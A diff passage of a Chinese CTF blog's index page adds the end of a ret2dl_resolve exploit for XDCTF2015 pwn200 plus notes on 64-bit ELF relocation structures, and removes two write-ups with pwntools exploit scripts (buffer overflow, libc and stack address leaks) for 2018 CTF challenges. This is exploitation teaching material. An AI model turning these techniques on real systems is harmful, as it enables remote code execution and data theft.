p32(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p32(r_info)</span><br><span class="line">fake_rel_addr = base_stage + <span class="number">28</span></span><br><span class="line">reloc_arg = fake_rel_addr - rel_plt</span><br><span class="line"></span><br><span class="line">system_addr = base_stage + <span class="number">100</span></span><br><span class="line">st_name = system_addr - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span> + p32(elf.plt[<span class="string">&#x27;read&#x27;</span>]) + p32(p3_ret) + p32(<span class="number">0</span>) + p32(base_stage) + p32(<span class="number">0x100</span>) + p32(pop_ebp) + p32(base_stage) + p32(leave_ret)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>,payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload += p32(plt0)</span><br><span class="line">payload += p32(reloc_arg)</span><br><span class="line">payload += <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload += p32(binsh_addr) <span class="comment">#这里直接改成binsh_addr作为system的参数即可，后面不删否则会改变前面布置的偏移</span></span><br><span class="line">payload += p32(binsh_addr)</span><br><span class="line">payload += p32(<span class="built_in">len</span>(binsh))</span><br><span class="line"><span class="comment">#fake_rel</span></span><br><span class="line">payload += fake_rel</span><br><span class="line"><span class="comment">#fake_sym</span></span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*align</span><br><span class="line">payload += fake_sym</span><br><span class="line">payload = payload.ljust(<span class="number">80</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += binsh</span><br><span class="line">payload = payload.ljust(<span class="number">100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += <span class="string">&#x27;system\x00&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
+
+<p>我们再执行一下，发现已经得到shell了</p>
+<img src="/2022/02/04/ret2_dl_resolve/pwn200-task4.jpg" class>
+
+<h3 id="64位下"><a href="#64位下" class="headerlink" title="64位下"></a>64位下</h3><ul>
+<li><p>64位的变化</p>
+<ul>
+<li><p>glibc 中默认编译使用的是 <code>ELF_Rela</code> 来记录重定位项的内容</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr        r_offset;                <span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword        r_info;                        <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">  Elf64_Sxword        r_addend;                <span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br><span class="line"><span class="comment">/* How to extract and insert information held in the r_info field.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_SYM(i)                        ((i) &gt;&gt; 32)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_TYPE(i)                        ((i) &amp; 0xffffffff)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_INFO(sym,type)                ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span></span><br></pre></td></tr></table></figure>
+
+<p>这里 Elf64_Addr、Elf64_Xword、Elf64_Sxword 都为 64 位，因此 Elf64_Rela 结构体的大小为 24 字节。</p>
+</li>
+<li><p>Elf64_Sym 结构体为</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word        st_name;                <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>        st_info;                <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;                <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Section        st_shndx;                <span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addr        st_value;                <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xword        st_size;                <span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure>
+
+<p>其中Elf64_Word 32 位、Elf64_Section 16 位、Elf64_Addr 64 位、Elf64_Xword 64 位，所以，Elf64_Sym 的大小为 24 个字节。</p>
+</li>
+</ul>
+</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/01/31/BROP/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -953,167 +1242,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/12/17/%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-gettingstart/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CharonPt的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/12/17/%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-gettingstart/" class="post-title-link" itemprop="url">护网杯_2018_gettingstart</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-12-17 15:50:23 / 修改时间：16:00:52" itemprop="dateCreated datePublished" datetime="2021-12-17T15:50:23+08:00">2021-12-17</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>小数在内存中的储存</p>
-<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>main() 函数如下，题目很简单，只要利用 buf[] 的越界将 v5 和 v6 覆盖成要求值即可 </p>
-<img src="/2021/12/17/%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-gettingstart/main.jpg" class>
-
-<p>一开始没想到怎么将 v6 覆盖成 0.1，然后就直接开编译器查看其在内存中的存储形式，如下</p>
-<img src="/2021/12/17/%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-gettingstart/%E8%B0%83%E8%AF%95-1.jpg" class>
-
-<p>exp如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26578</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0x7FFFFFFFFFFFFFFF</span>) + p64(<span class="number">0x3fb999999999999a</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/12/17/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-guess/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CharonPt的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/12/17/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-guess/" class="post-title-link" itemprop="url">网鼎杯2018_guess</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-12-17 11:18:04 / 修改时间：12:35:50" itemprop="dateCreated datePublished" datetime="2021-12-17T11:18:04+08:00">2021-12-17</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ol>
-<li>在触发 <code>__stack_chk_fail</code> 时，其会打印出 argv[0] 指针所指向的字符串，正常情况下，这个指针指向了程序名，但是如果我们能够修改这个指针的内容，就可以让 <code>__stack_chk_fail</code> 打印出我们想要的内容</li>
-<li>libc 中保存了一个叫 <code>__environ</code> 的函数，其存储当前进程的环境变量地址，而环境变量存储在栈上，所以 <code>__environ</code> 存储的也是栈上的地址，可以通过泄漏 <code>__environ</code> 的内容得到栈地址</li>
-</ol>
-<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>程序保护如下</p>
-<img src="/2021/12/17/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-guess/checksec.jpg" class>
-
-<p>主逻辑如下</p>
-<img src="/2021/12/17/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-guess/main-1.jpg" class>
-
-<img src="/2021/12/17/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-guess/main-2.jpg" class>
-
-<p>可以看到程序先将 flag 写到了栈上，然后进入while循环，跟进到 <code>sub_400A11</code> </p>
-<img src="/2021/12/17/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-guess/sub_400A11.jpg" class>
-
-<p>程序在这个函数内 fork() 了子进程，然后将 fork() 的返回值返回，到 main() 函数处子进程break，继续往下执行，父进程在while循环内被 wait() 阻塞。</p>
-<p>因为 v7 = 0，v8 = 3，所以父进程最多 fork 出3个子进程后就会退出。</p>
-<p>下面的内容就是给了一个 gets() ，然后将我们的输入跟 buf，也就是写到栈上的flag进行比较。比较部分是没有意义的，所以这题的关键在于如何泄漏出栈上的flag。</p>
-<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>因为我们的输入 s2 在 buf 的上方，所以我们的输入不会覆盖到栈上的flag。同时因为存在Canary，而且因为是子进程执行我们的输入，所以子进程触发了Canary也没有关系。那么我们就可以利用<code>__stack_chk_fail</code> 来泄漏一些内容。</p>
-<p>总体思路：</p>
-<p>①利用 gets() 的溢出将栈上的 argv[0] 的内容覆盖为 libc 中函数的地址，然后执行 <code>__stack_chk_fail</code> 时就会打印出 libc 中的地址，以此泄漏 libc 地址。</p>
-<p>②再将 argv[0] 覆盖成 libc 中的 <code>__environ</code> 函数，以此泄漏栈地址。</p>
-<p>③得到栈地址后只需要计算出泄漏的栈地址跟 buf 的偏移即可得到 buf 的地址，然后将 argv[0] 覆盖成buf的地址即可</p>
-<p>过程如下：</p>
-<p>先找到我们的输入与 argv[0] 的相对距离，在 strcmp() 下断点查看栈空间</p>
-<img src="/2021/12/17/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-guess/%E8%B0%83%E8%AF%95-1.jpg" class>
-
-<img src="/2021/12/17/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-guess/%E8%B0%83%E8%AF%95-2.jpg" class>
-
-<p>所以我们需要输入 0x128 个字节作padding，然后再加需要泄漏的内容即可覆盖 argv[0]，我们输入 <code>&#39;a&#39;*0x128 + p64(elf.got[&#39;puts&#39;])</code> 查看结果</p>
-<img src="/2021/12/17/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-guess/%E8%B0%83%E8%AF%95-3.jpg" class>
-
-<p>可以看到成功泄漏出了 libc 的函数的地址，接下来的过程不再赘述，exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./guess&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./guess&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;flag&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;puts_addr =&gt; &#x27;</span>,<span class="built_in">hex</span>(addr)</span><br><span class="line">libc_base = addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">environ = libc_base + libc.symbols[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;flag&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(environ))</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;stack_addr =&gt; &#x27;</span>,<span class="built_in">hex</span>(stack_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;flag&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(stack_addr - <span class="number">0x168</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1183,14 +1311,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">47</span>
+          <span class="site-state-item-count">49</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">30</span>
+        <span class="site-state-item-count">32</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
